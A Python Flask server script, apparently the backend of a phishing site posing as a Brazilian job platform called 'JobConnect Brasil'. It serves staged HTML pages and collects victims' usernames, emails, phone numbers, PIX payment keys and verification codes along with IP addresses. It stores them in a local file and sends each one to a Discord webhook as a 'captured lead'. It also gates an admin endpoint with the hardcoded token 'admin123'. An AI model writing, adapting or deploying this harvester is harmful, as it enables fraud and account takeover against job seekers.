#!/usr/bin/env python3
"""
SERVIDOR WEB - JobConnect Brasil
Serve seus arquivos HTML e captura leads para o Discord
"""

from flask import Flask, request, jsonify, send_from_directory
import os
import json
import requests
import threading
from datetime import datetime
import logging

# Configurações
from dotenv import load_dotenv

load_dotenv()

CONFIG = {
    "DISCORD_WEBHOOK": os.getenv("DISCORD_WEBHOOK"),
    "PORT": int(os.getenv("PORT", 8080)),
    "DEBUG": os.getenv("DEBUG", "False") == "True"
}

# Logging
logging.basicConfig(level=logging.DEBUG if CONFIG["DEBUG"] else logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# ============================================
# BANCO DE DADOS
# ============================================

class Database:
    def __init__(self):
        self.leads = []
        self.load()
    
    def load(self):
        try:
            with open('leads.json', 'r') as f:
                self.leads = json.load(f)
        except:
            self.leads = []
    
    def save(self):
        with open('leads.json', 'w') as f:
            json.dump(self.leads, f, indent=2)
    
    def add(self, data):
        data['id'] = len(self.leads) + 1
        data['timestamp'] = datetime.now().isoformat()
        self.leads.append(data)
        self.save()
        logger.info(f"Lead #{data['id']} salvo: {data.get('username', 'N/A')}")
        return data['id']

db = Database()

# ============================================
# ENVIO PARA DISCORD
# ============================================

def send_to_discord(lead_data):
    """Envia lead para o Discord"""
    
    embed = {
        "embeds": [{
            "title": "🎯 NOVO LEAD CAPTURADO!",
            "color": 0x00ff00,
            "fields": [
                {"name": "👤 Usuário", "value": lead_data.get("username", "Não informado")[:256], "inline": True},
                {"name": "📧 E-mail", "value": lead_data.get("email", "Não informado")[:256], "inline": True},
                {"name": "📱 Telefone", "value": lead_data.get("phone", "Não informado")[:256], "inline": True},
                {"name": "💳 Chave PIX", "value": lead_data.get("pix_key", "Não informado")[:256], "inline": True},
                {"name": "🔐 Código", "value": lead_data.get("verification_code", "Não informado")[:256], "inline": True},
                {"name": "🌐 IP", "value": lead_data.get("ip", "Desconhecido"), "inline": True},
                {"name": "📱 User Agent", "value": lead_data.get("user_agent", "Desconhecido")[:100], "inline": False},
                {"name": "🕐 Data", "value": datetime.now().strftime("%d/%m/%Y %H:%M:%S"), "inline": True},
                {"name": "📍 Etapa", "value": f"Passo {lead_data.get('step', 'N/A')}", "inline": True}
            ],
            "footer": {"text": f"JobConnect - Lead #{lead_data.get('id', 'N/A')}"},
            "timestamp": datetime.now().isoformat()
        }]
    }
    
    try:
        response = requests.post(CONFIG["DISCORD_WEBHOOK"], json=embed, timeout=10)
        if response.status_code == 204:
            logger.info(f"✅ Lead enviado para Discord")
        else:
            logger.error(f"❌ Erro Discord: {response.status_code}")
    except Exception as e:
        logger.error(f"❌ Erro ao enviar Discord: {e}")

# ============================================
# ROTAS
# ============================================

@app.route("/")
def index():
    return send_from_directory(".", "pagina3.html")

@app.route("/<path:filename>")
def serve_file(filename):
    if os.path.exists(filename):
        return send_from_directory(".", filename)
    return "Arquivo não encontrado", 404

@app.route("/api/lead", methods=["POST"])
def api_lead():
    data = request.get_json()
    if not data:
        return jsonify({"error": "Dados inválidos"}), 400
    
    # Adicionar IP
    data['ip'] = request.remote_addr
    
    # Salvar no banco
    lead_id = db.add(data)
    data['id'] = lead_id
    
    # Enviar para Discord em thread
    threading.Thread(target=send_to_discord, args=(data,), daemon=True).start()
    
    return jsonify({"success": True, "lead_id": lead_id})

@app.route("/admin/leads")
def admin_leads():
    token = request.args.get("token")
    if token != "admin123":
        return jsonify({"error": "Não autorizado"}), 401
    return jsonify(db.leads[-50:])

@app.route("/health")
def health():
    return jsonify({
        "status": "ok",
        "leads": len(db.leads),
        "timestamp": datetime.now().isoformat()
    })

# ============================================
# INICIAR
# ============================================

if __name__ == "__main__":
    print("="*50)
    print("Servidor JobConnect Brasil")
    print(f"Porta: {CONFIG['PORT']}")
    print(f"Arquivos: pagina3.html (inicial), pagina2.html, pagina1.html")
    print("="*50)
    
    app.run(host="0.0.0.0", port=CONFIG["PORT"], debug=CONFIG["DEBUG"])

